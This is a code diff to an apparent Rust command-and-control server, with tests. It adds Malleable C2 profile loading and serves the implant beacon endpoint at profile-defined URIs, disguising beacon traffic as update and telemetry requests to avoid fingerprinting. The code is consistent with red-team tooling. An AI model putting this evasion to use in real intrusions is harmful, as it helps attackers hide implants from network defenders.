@@ -41,6 +41,9 @@ pub struct Session {
 pub struct AppState {
     pub keypair: ServerKeypair,
     pub sessions: DashMap<SessionId, Session>,
+    /// Active Malleable C2 profile (loaded from `NYX_PROFILE`). When present,
+    /// the beacon handler is also served at the profile's transaction URIs.
+    pub profile: Option<nyx_profile::Profile>,
 }
 
 impl Default for AppState {
@@ -48,17 +51,68 @@ impl Default for AppState {
         Self {
             keypair: ServerKeypair::generate(),
             sessions: DashMap::new(),
+            profile: None,
         }
     }
 }
 
+/// Load + lint a Malleable C2 profile from disk. Returns the parsed profile, or
+/// an error if the file can't be read, fails to parse, or has `c2lint` errors.
+pub fn load_profile(path: &std::path::Path) -> anyhow::Result<nyx_profile::Profile> {
+    let src = std::fs::read_to_string(path)
+        .map_err(|e| anyhow::anyhow!("read profile {}: {e}", path.display()))?;
+    let profile = nyx_profile::parse(&src)
+        .map_err(|e| anyhow::anyhow!("parse profile: {e}"))?;
+    let errors: Vec<_> = nyx_profile::lint(&profile)
+        .into_iter()
+        .filter(|d| d.severity == nyx_profile::Severity::Error)
+        .collect();
+    if errors.is_empty() {
+        Ok(profile)
+    } else {
+        let msgs: Vec<_> = errors
+            .iter()
+            .map(|d| format!("  line {}: {}", d.line, d.message))
+            .collect();
+        anyhow::bail!(
+            "profile {} has {} lint error(s):\n{}",
+            path.display(),
+            errors.len(),
+            msgs.join("\n")
+        )
+    }
+}
+
 pub fn router(state: Arc<AppState>) -> Router {
-    Router::new()
+    // Collect any profile-declared beacon URIs before `state` moves into the
+    // router. The beacon handler is URI-agnostic (it just decrypts the body), so
+    // serving it at the profile's transaction URIs makes the beacon path
+    // malleable — the most fingerprinted C2 indicator — without touching crypto.
+    let extra: Vec<String> = state
+        .profile
+        .as_ref()
+        .map(|p| {
+            p.http_post()
+                .into_iter()
+                .chain(p.http_get())
+                .filter_map(|b| b.get("uri").map(|u| u.as_str().into_owned()))
+                .collect()
+        })
+        .unwrap_or_default();
+
+    let mut r = Router::new()
         .route("/beacon", post(beacon))
         .route("/api/sessions", get(list_sessions))
         .route("/api/task", post(post_task))
-        .route("/api/results", get(get_results))
-        .with_state(state)
+        .route("/api/results", get(get_results));
+    let mut seen = std::collections::HashSet::new();
+    for uri in extra {
+        if uri.is_empty() || uri == "/beacon" || !seen.insert(uri.clone()) {
+            continue;
+        }
+        r = r.route(&uri, post(beacon));
+    }
+    r.with_state(state)
 }
 
 // ---- implant endpoint ------------------------------------------------------
@@ -291,4 +345,39 @@ async fn get_results(State(st): State<Arc<AppState>>, Query(q): Query<ResultsQue
         })
         .collect();
     (StatusCode::OK, Json(views)).into_response()
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    const MIN_PROFILE: &str = r#"http-get { set uri "/api/v1/Updates"; client { metadata { header "Cookie"; } } server { output { print; } } } http-post { set uri "/api/v1/Telemetry"; client { output { print; } } server { output { print; } } }"#;
+
+    #[test]
+    fn load_profile_accepts_valid() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("ok.profile");
+        std::fs::write(&path, MIN_PROFILE).unwrap();
+        let p = load_profile(&path).expect("valid profile must load + lint clean");
+        assert_eq!(
+            p.http_post().unwrap().get("uri").unwrap().as_str(),
+            "/api/v1/Telemetry"
+        );
+    }
+
+    #[test]
+    fn load_profile_rejects_lint_errors() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("bad.profile");
+        // missing http-get -> c2lint error
+        std::fs::write(
+            &path,
+            r#"http-post { set uri "/p"; client { output { print; } } server { output { print; } } }"#,
+        )
+        .unwrap();
+        assert!(
+            load_profile(&path).is_err(),
+            "a profile with lint errors must be rejected"
+        );
+    }
 }
